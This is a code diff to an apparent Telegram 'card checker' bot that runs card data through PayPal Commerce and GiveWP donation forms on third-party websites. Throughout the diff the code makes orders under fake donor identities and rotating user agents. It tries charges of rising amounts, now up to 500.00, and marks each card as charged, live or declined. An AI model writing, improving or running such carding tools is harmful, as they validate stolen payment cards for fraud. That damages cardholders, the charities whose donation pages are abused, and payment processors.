@@ -106,7 +106,7 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ===================== PAYPAL COMMERCE CLASS (FINAL V3) =====================
+# ===================== PAYPAL COMMERCE CLASS (FINAL V4) =====================
 
 class PayPalCommerce:
     def __init__(self, target_url):
@@ -130,6 +130,7 @@ class PayPalCommerce:
         if urlparse(target_url).query:
             self.inurl += f"?{urlparse(target_url).query}"
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
+        self.is_valid_gateway = True
         
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -249,20 +250,18 @@ class PayPalCommerce:
                 self.minimum_amount = max(min_inputs, key=float)
                 return
             
-            js_patterns = [
-                r'(?:var|let|const)\s+\w*(?:min|minimum)\w*\s*=\s*["\']?([\d.]+)',
-                r'min(?:imum)?(?:_amount|Amount)?\s*[:=]\s*["\']?([\d.]+)',
-                r'minimum\s*[:=]\s*["\']?([\d.]+)',
-            ]
-            for pattern in js_patterns:
-                matches = re.findall(pattern, html, re.IGNORECASE)
-                if matches:
-                    self.minimum_amount = max(matches, key=float)
-                    return
-            
             self.minimum_amount = "1.00"
         except:
             self.minimum_amount = "1.00"
+
+    def _is_not_paypal_page(self, html):
+        if not html:
+            return True
+        paypal_indicators = ['paypal', 'client-id', 'client_id', 'admin-ajax', 'give-form', 'donation-form', 'give_paypal', 'paypal_commerce', 'givewp']
+        has_indicator = any(indicator in html.lower() for indicator in paypal_indicators)
+        if not has_indicator:
+            return True
+        return False
 
     def _init_and_extract(self):
         try:
@@ -274,12 +273,18 @@ class PayPalCommerce:
             response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
             self.cookies = dict(response.cookies)
             html = response.text
+            
+            if self._is_not_paypal_page(html):
+                self.is_valid_gateway = False
+                return
+            
             self._extract_client_id(html)
             self._extract_form_data(html)
             self._extract_ajax_url(html)
             self._extract_minimum_amount(html)
         except Exception as e:
             print(f"Init error: {e}")
+            self.is_valid_gateway = False
 
     def _extract_client_id(self, html):
         patterns = [
@@ -384,6 +389,8 @@ class PayPalCommerce:
             return None
 
     def _create_order(self):
+        if not self.is_valid_gateway:
+            return None
         if self.ajax_url:
             order_id = self._create_order_givewp()
             if order_id:
@@ -405,7 +412,7 @@ class PayPalCommerce:
         amounts_to_try = []
         if self.minimum_amount and self.minimum_amount != "1.00":
             amounts_to_try.append(self.minimum_amount)
-        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
+        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
         
         headers = {
             'user-agent': self.get_next_ua(),
@@ -531,7 +538,7 @@ class PayPalCommerce:
         amounts_to_try = []
         if self.minimum_amount and self.minimum_amount != "1.00":
             amounts_to_try.append(self.minimum_amount)
-        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
+        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
         
         headers = {
             'user-agent': self.get_next_ua(),
@@ -561,7 +568,6 @@ class PayPalCommerce:
         return None
 
     def _is_name_response(self, text):
-        """التحقق إذا كان النص مجرد اسم شخص"""
         text_strip = text.strip()
         text_lower = text_strip.lower()
         
@@ -572,8 +578,10 @@ class PayPalCommerce:
             for ln in self.last_name:
                 if text_strip == f"{fn} {ln}":
                     return True
+                if f"{fn} {ln}" in text_strip and len(text_strip) < 50:
+                    return True
         
-        paypal_keywords = ['error', 'declined', 'insufficient', 'approved', 'charge', 'true', 'invalid', 'amount', 'order', 'payer', 'card', 'payment', 'issue', 'name', 'message', 'details', 'description', 'minimum', 'donation', 'address', 'city', 'state', 'zip', 'phone', 'title', 'prefix', 'create', 'failed', 'action', 'required', 'cannot', 'pay']
+        paypal_keywords = ['error', 'declined', 'insufficient', 'approved', 'charge', 'true', 'invalid', 'amount', 'order', 'payer', 'card', 'payment', 'issue', 'name', 'message', 'details', 'description', 'minimum', 'donation', 'address', 'city', 'state', 'zip', 'phone', 'title', 'prefix', 'create', 'failed', 'action', 'required', 'cannot', 'pay', 'donate']
         
         if len(text_strip) < 100:
             has_keyword = any(k in text_lower for k in paypal_keywords)
@@ -584,6 +592,9 @@ class PayPalCommerce:
 
     def Charge(self, ccx):
         try:
+            if not self.is_valid_gateway:
+                return "INVALID_GATEWAY"
+            
             parts = ccx.strip().split("|")
             if len(parts) < 4:
                 return "Invalid card format"
@@ -642,7 +653,6 @@ class PayPalCommerce:
                 except:
                     continue
             
-            # استخراج الرد من confirm_json
             if isinstance(confirm_json, dict):
                 if 'details' in confirm_json and len(confirm_json['details']) > 0:
                     detail = confirm_json['details'][0]
@@ -663,7 +673,6 @@ class PayPalCommerce:
                 if 'message' in confirm_json:
                     return confirm_json.get('message', '')
             
-            # استخراج من confirm_text
             if confirm_text:
                 try:
                     text_json = json.loads(confirm_text)
@@ -703,7 +712,6 @@ class PayPalCommerce:
                         return f"{name}: {msg_matches[0]}"
                     return name
             
-            # Approve order
             approve_res = self._approve_order(order_id)
             text = approve_res.text if approve_res else ''
             
@@ -711,12 +719,9 @@ class PayPalCommerce:
                 text_lower = text.lower()
                 text_strip = text.strip()
                 
-                # ===== CHARGE حقيقي فقط =====
-                # لو النص حرفياً "true" (من givewp approve)
                 if text_strip.lower() == 'true':
                     return 'CHARGE 1.0'
                 
-                # لو في capture status COMPLETED
                 try:
                     approve_json = approve_res.json()
                     if isinstance(approve_json, dict):
@@ -724,7 +729,6 @@ class PayPalCommerce:
                             status_val = str(approve_json['status']).upper()
                             if status_val == 'COMPLETED':
                                 return 'CHARGE 1.0'
-                        
                         if 'purchase_units' in approve_json:
                             for unit in approve_json['purchase_units']:
                                 if 'payments' in unit:
@@ -733,7 +737,6 @@ class PayPalCommerce:
                                         for capture in payments['captures']:
                                             if capture.get('status', '').upper() == 'COMPLETED':
                                                 return 'CHARGE 1.0'
-                        
                         if 'data' in approve_json:
                             if isinstance(approve_json['data'], dict):
                                 if 'status' in approve_json['data']:
@@ -743,15 +746,12 @@ class PayPalCommerce:
                 except:
                     pass
                 
-                # ===== ORDER_NOT_APPROVED =====
                 if 'order_not_approved' in text_lower:
                     return "Payer cannot pay for this transaction."
                 
-                # ===== Michael Williams =====
                 if self._is_name_response(text):
                     return "PAYER_ACTION_REQUIRED"
                 
-                # ===== استخراج الرد الفعلي =====
                 try:
                     approve_json = approve_res.json()
                     if isinstance(approve_json, dict):
@@ -809,15 +809,10 @@ async def check_card_api(card_full, gateway_url):
             result = str(result_raw)
             result_lower = result.lower()
             
-            # ===== CHARGE حقيقي فقط =====
             if result.startswith("CHARGE"):
                 return "approved", result_raw
-            
-            # ===== LIVE =====
             elif "insufficient" in result_lower:
                 return "live", result_raw
-            
-            # ===== DECLINED =====
             else:
                 if result.startswith("Error:"):
                     result = result.replace("Error:", "").strip()
@@ -1471,7 +1466,7 @@ async def remove_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
             json.dump(STRIPE_KEYS, f)
         await update.message.reply_text(premium_emoji(f"✅ Key {key_id} removed!"), parse_mode="HTML")
 
-# ============ دوال التنسيق والفحص ============
+# ============ دوال التنسيق ============
 
 async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
@@ -1596,6 +1591,8 @@ async def format_auth_response(card_full, result_dict, taken, user_id, mode="Sin
 [⎇] Req By: <code>{user_id}</code> ({user_status})
 - - - - - - - - - - - - - - - - - - - - - -
 [⌤] Dev by: WAFA 🍀""")
+
+# ============ أوامر الفحص ============
 
 async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
